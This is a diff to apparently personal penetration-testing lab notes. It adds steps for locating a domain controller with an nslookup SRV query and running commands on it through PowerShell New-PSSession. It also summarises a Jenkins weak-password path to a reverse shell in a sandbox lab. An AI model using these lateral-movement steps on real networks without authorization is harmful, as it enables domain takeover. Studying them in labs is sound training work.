@@ -3748,8 +3748,46 @@ meterpreter > shell
 #+end_src
 
 ** Targeting the Domain Controller
+   + info:
+     - assume `Domain Admins` privilege
+     - possible to access the DC with the PowerShell New-PSSession cmdlet.
+     - use nslookup to confirm DC IP
+     - search the `_ldap._tcp.dc._dsdcs_` entry within the domain. the result returns the hostname of the DC.
+   + ref: 
+     - [[https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession][New-PSSession]]
+     - [[https://serverfault.com/questions/78089/find-name-of-active-directory-domain-controller/78093#78093][nslookup find AD's DNS (DC), serverfault]]
+     - [[https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/verify-srv-dns-records-have-been-created][nslookup find DC, MS doc]]
+   + src (nslookup):
+   #+begin_src powershell
+C:\Windows\system32> nslookup
+> set type=all
+  # _ldap._tcp.dc._msdcs.<DOMAIN_NAME>
+> _ldap._tcp.dc._msdcs.sandbox.local
+  # _ldap._tcp.dc._msdcs.sandbox.local SRV service location:
+  #       priority = 0
+  #       weight = 100
+  #       port = 389
+  #       svr hostname = SANDBOXDC.sandbox.local
+  # *SANDBOXDC*.sandbox.local internet address = 10.5.5.30
+   #+end_src
    
-         
+** RCE with New-PSSession (ASSUME `Domain Admins`)
+   + ref:
+     - [[https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.1][New-PSSession (MS doc)]]
+     - [[https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pssessions?view=powershell-7.1][PSSession basic usage (MS doc)]]
+
+   #+begin_src powershell
+PS C:\Windows\system32> $dcsesh = New-PSSession -Computer SANDBOXDC
+PS C:\Windows\system32> Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
+PS C:\Windows\system32> Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
+PS C:\Windows\system32> Get-PSSession  
+  # Id   Name       ComputerName    State    ConfigurationName
+  # ---  ----       ------------    -----    ---------------------
+  # 1    Session1   Server01        Opened   Microsoft.PowerShell
+  # 2    Session2   Server02        Opened   Microsoft.PowerShell
+PS C:\Windows\system32> $ps01 = Get-PSSession -Id 1 
+   #+end_src
+
 * msf payload internal
 ** an example
    + ref:
@@ -3837,7 +3875,9 @@ meterpreter > shell
     - on open Ports scan further with default scripts `nmap -sC` (PWK p819)
     - 30 is a DC, which tends to be hardened. 25 has opened `8080 http-proxy` -> config firefox proxy and visit the page (proxy SOCKS v4 127.0.0.1:1080)(PWK p822) -> Jenkins server
     - Inspect Element, Expand All, try weak password -> admin admin logged success.
-    - Check the Jenkins documentation -> code execution -> download payload -> reverse shell (jenkinsuser)
+    - Check the Jenkins documentation -> code execution -> download payload -> reverse shell (jenkinsuser, Domain Admins)
+    - nslookup -> `_ldap._tcp.dc._msdcs.sandbox.local` returns DC's ComputerName.
+    - `$s=New-PSSession -Computer <ComputerName>` get remote session on DC.
 
       
 * AV bypass
